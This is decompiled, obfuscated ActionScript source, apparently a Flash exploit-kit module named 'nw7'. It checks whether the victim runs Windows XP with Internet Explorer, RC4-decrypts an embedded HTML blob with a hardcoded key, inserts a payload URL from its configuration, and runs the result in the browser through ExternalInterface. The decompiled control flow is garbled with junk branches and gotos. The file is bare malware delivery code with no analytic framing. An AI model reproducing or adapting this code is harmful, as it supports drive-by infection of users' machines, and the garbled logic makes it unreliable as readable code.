package blobs
{
   import flash.system.Capabilities;
   import flash.utils.ByteArray;
   import Crypt.Crypt;
   import flash.external.ExternalInterface;
   
   public final class nw7
   {
       
      private var targets_info:Object;
      
      private var config_json:Object;
      
      private var m_myClass05:Class;
      
      private var m_myStr08:String;
      
      public function nw7(param1:Object, param2:Object)
      {
         if(!_loc7_)
         {
            m_myClass05 = §nw7_html_rc4$d73edc68888fb8485c1a384f273328d9-1886692465§;
            if(!_loc7_)
            {
               if(!_loc6_)
               {
               }
               super();
               if(!_loc6_)
               {
                  if(!_loc6_)
                  {
                  }
                  this.config_json = param1;
                  if(_loc7_)
                  {
                  }
               }
               addr94:
               Crypt.rc4(_loc5_,this.m_myStr08).uncompress("deflate");
               if(!_loc7_)
               {
                  §§push(_loc3_);
                  if(!_loc7_)
                  {
                     §§push("%payloadUrl%");
                     if(!_loc7_)
                     {
                        §§push(§§pop().replace(§§pop(),this.config_json.link.pnw7));
                        if(!_loc7_)
                        {
                           if(!_loc7_)
                           {
                              if(_loc7_)
                              {
                                 addr158:
                                 loop0:
                                 while(true)
                                 {
                                    §§push(_loc4_);
                                    if(!_loc6_)
                                    {
                                       if(!_loc6_)
                                       {
                                          if(!_loc7_)
                                          {
                                             §§push("%embedHtml%");
                                             if(!_loc6_)
                                             {
                                                §§push(§§pop().replace(§§pop(),escape(_loc3_)));
                                             }
                                          }
                                       }
                                    }
                                    addr177:
                                    addr202:
                                    if(!_loc7_)
                                    {
                                       if(_loc6_)
                                       {
                                       }
                                    }
                                    while(true)
                                    {
                                       if(!_loc6_)
                                       {
                                       }
                                       break loop0;
                                       §§goto(addr177);
                                    }
                                 }
                                 return;
                              }
                              while(true)
                              {
                              }
                           }
                           addr232:
                           while(true)
                           {
                              if(!_loc6_)
                              {
                                 §§goto(addr158);
                              }
                              §§goto(addr243);
                           }
                        }
                        addr231:
                        while(true)
                        {
                           §§goto(addr232);
                        }
                     }
                     addr225:
                     while(true)
                     {
                        §§goto(addr231);
                     }
                  }
                  while(true)
                  {
                     §§goto(addr225);
                  }
               }
               while(true)
               {
                  if(!_loc6_)
                  {
                  }
                  ExternalInterface.call("function (){" + _loc4_ + "}");
                  §§goto(addr202);
               }
            }
            if(!_loc6_)
            {
            }
            this.targets_info = param2;
            if(!_loc6_)
            {
               if(!_loc6_)
               {
               }
               if(false === this.isSuitable())
               {
                  if(_loc6_)
                  {
                  }
               }
               else
               {
                  this.m_myStr08 = "edfdamtlkfg511485";
               }
            }
            §§goto(addr94);
         }
         if(!_loc6_)
         {
         }
      }
      
      public final function isSuitable() : Boolean
      {
         if(!_loc1_)
         {
            if("Windows XP" !== Capabilities.os)
            {
               if(!_loc1_)
               {
                  §§push(false);
                  if(!_loc1_)
                  {
                     return §§pop();
                  }
                  addr41:
                  if(§§pop() !== this.targets_info.isIe)
                  {
                     §§push(true);
                  }
               }
            }
            else
            {
               §§push(false);
               if(!_loc2_)
               {
                  §§goto(addr41);
               }
            }
            addr50:
            return §§pop();
         }
         §§push(false);
         if(!_loc1_)
         {
            return §§pop();
         }
         §§goto(addr50);
      }
   }
}
